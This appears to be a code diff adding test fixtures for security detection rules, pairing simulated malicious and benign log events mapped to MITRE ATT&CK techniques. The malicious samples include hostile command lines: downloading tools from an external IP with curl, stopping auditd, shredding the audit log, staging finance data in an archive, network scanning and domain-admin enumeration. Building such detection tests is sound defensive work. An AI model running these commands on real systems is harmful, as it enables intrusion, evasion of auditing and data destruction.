@@ -721,4 +721,267 @@ def get_all_fixtures() -> Dict[str, DetectionFixture]:
         expected_mitre_technique="T1136",
     )
 
+    # 22. DET-DISC-001: Active Directory Domain & Account Discovery
+    pos_ad_disc = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="wkstn01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="net.exe",
+                command_line="net group \"Domain Admins\" /domain",
+            ),
+        )
+    ]
+    neg_ad_disc = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="wkstn01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="net.exe",
+                command_line="net use Z: \\\\filesrv\\share",
+            ),
+        )
+    ]
+    fixtures["DET-DISC-001"] = DetectionFixture(
+        rule_id="DET-DISC-001",
+        rule_name="Active Directory Domain & Account Discovery",
+        positive_events=pos_ad_disc,
+        negative_events=neg_ad_disc,
+        expected_severity=EventSeverity.MEDIUM,
+        expected_mitre_technique="T1087",
+    )
+
+    # 23. DET-DISC-002: Internal Network & Port Scanning Discovery
+    pos_port_scan = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="nmap",
+                command_line="nmap -sS -p 22,80,443,445,3389 172.28.20.0/24",
+            ),
+        )
+    ]
+    neg_port_scan = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="ping",
+                command_line="ping -c 3 127.0.0.1",
+            ),
+        )
+    ]
+    fixtures["DET-DISC-002"] = DetectionFixture(
+        rule_id="DET-DISC-002",
+        rule_name="Internal Network & Port Scanning Discovery",
+        positive_events=pos_port_scan,
+        negative_events=neg_port_scan,
+        expected_severity=EventSeverity.HIGH,
+        expected_mitre_technique="T1046",
+    )
+
+    # 24. DET-DISC-003: System & Security Configuration Discovery
+    pos_sys_disc = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="systeminfo",
+                command_line="systeminfo",
+            ),
+        )
+    ]
+    neg_sys_disc = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="ls",
+                command_line="ls -la /home/user",
+            ),
+        )
+    ]
+    fixtures["DET-DISC-003"] = DetectionFixture(
+        rule_id="DET-DISC-003",
+        rule_name="System & Security Configuration Discovery",
+        positive_events=pos_sys_disc,
+        negative_events=neg_sys_disc,
+        expected_severity=EventSeverity.LOW,
+        expected_mitre_technique="T1082",
+    )
+
+    # 25. DET-C2-001: Ingress Tool Transfer & Staging
+    pos_c2_transfer = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="curl",
+                command_line="curl -o /tmp/impacket_tools.py http://198.51.100.5/tools.py",
+            ),
+        )
+    ]
+    neg_c2_transfer = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="curl",
+                command_line="curl -s https://api.github.com/zen",
+            ),
+        )
+    ]
+    fixtures["DET-C2-001"] = DetectionFixture(
+        rule_id="DET-C2-001",
+        rule_name="Ingress Tool Transfer & Staging",
+        positive_events=pos_c2_transfer,
+        negative_events=neg_c2_transfer,
+        expected_severity=EventSeverity.HIGH,
+        expected_mitre_technique="T1105",
+    )
+
+    # 26. DET-C2-002: Encrypted C2 Beaconing / External Channel
+    pos_c2_beacon = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.NETWORK, action="c2_beacon"),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            destination=EndpointInfo(ip="198.51.100.20", port=443),
+            message="Periodic C2 beacon connection established to 198.51.100.20:443",
+            custom={"is_c2_traffic": True},
+        )
+    ]
+    neg_c2_beacon = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.NETWORK, action="dns_lookup"),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            destination=EndpointInfo(ip="172.28.20.10", port=53),
+            message="Standard internal DNS query to corporate DC",
+        )
+    ]
+    fixtures["DET-C2-002"] = DetectionFixture(
+        rule_id="DET-C2-002",
+        rule_name="Encrypted C2 Beaconing / External Channel",
+        positive_events=pos_c2_beacon,
+        negative_events=neg_c2_beacon,
+        expected_severity=EventSeverity.HIGH,
+        expected_mitre_technique="T1071",
+    )
+
+    # 27. DET-COLL-001: Sensitive Data Staging & Archive Compression
+    pos_archive = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="tar",
+                command_line="tar -czf /tmp/confidential_data.tar.gz /var/data/finance",
+            ),
+        )
+    ]
+    neg_archive = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="tar",
+                command_line="tar -xzf /opt/deployments/app.tar.gz -C /opt/app",
+            ),
+        )
+    ]
+    fixtures["DET-COLL-001"] = DetectionFixture(
+        rule_id="DET-COLL-001",
+        rule_name="Sensitive Data Staging & Archive Compression",
+        positive_events=pos_archive,
+        negative_events=neg_archive,
+        expected_severity=EventSeverity.HIGH,
+        expected_mitre_technique="T1560",
+    )
+
+    # 28. DET-COLL-002: Sensitive Data & Database Harvesting
+    pos_harvest = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.WEB, action="portal.doc.access"),
+            host=HostInfo(name="portal.app.local"),
+            message="Unauthorized BOLA access to confidential doc",
+            custom={"unauthorized_bola": True, "doc_id": "DOC-999"},
+        )
+    ]
+    neg_harvest = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.WEB, action="portal.doc.access"),
+            host=HostInfo(name="portal.app.local"),
+            message="Authorized document access by owner",
+            custom={"unauthorized_bola": False, "doc_id": "DOC-001"},
+        )
+    ]
+    fixtures["DET-COLL-002"] = DetectionFixture(
+        rule_id="DET-COLL-002",
+        rule_name="Sensitive Data & Database Harvesting",
+        positive_events=pos_harvest,
+        negative_events=neg_harvest,
+        expected_severity=EventSeverity.HIGH,
+        expected_mitre_technique="T1005",
+    )
+
+    # 29. DET-IMP-001: Critical Service Termination / Disruption
+    pos_service_stop = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="systemctl",
+                command_line="systemctl stop auditd",
+            ),
+        )
+    ]
+    neg_service_stop = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="systemctl",
+                command_line="systemctl status auditd",
+            ),
+        )
+    ]
+    fixtures["DET-IMP-001"] = DetectionFixture(
+        rule_id="DET-IMP-001",
+        rule_name="Critical Service Termination / Disruption",
+        positive_events=pos_service_stop,
+        negative_events=neg_service_stop,
+        expected_severity=EventSeverity.HIGH,
+        expected_mitre_technique="T1489",
+    )
+
+    # 30. DET-IMP-002: Data Destruction & Ransomware Activity
+    pos_destruction = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="shred",
+                command_line="shred -u -z /var/log/audit/audit.log",
+            ),
+        )
+    ]
+    neg_destruction = [
+        ECSEvent(
+            event=EventMetadata(category=EventCategory.PROCESS),
+            host=HostInfo(name="srv01.corp.enterprise.local"),
+            process=ProcessInfo(
+                name="rm",
+                command_line="rm /tmp/temp_cache.txt",
+            ),
+        )
+    ]
+    fixtures["DET-IMP-002"] = DetectionFixture(
+        rule_id="DET-IMP-002",
+        rule_name="Data Destruction & Ransomware Activity",
+        positive_events=pos_destruction,
+        negative_events=neg_destruction,
+        expected_severity=EventSeverity.CRITICAL,
+        expected_mitre_technique="T1485",
+    )
+
     return fixtures
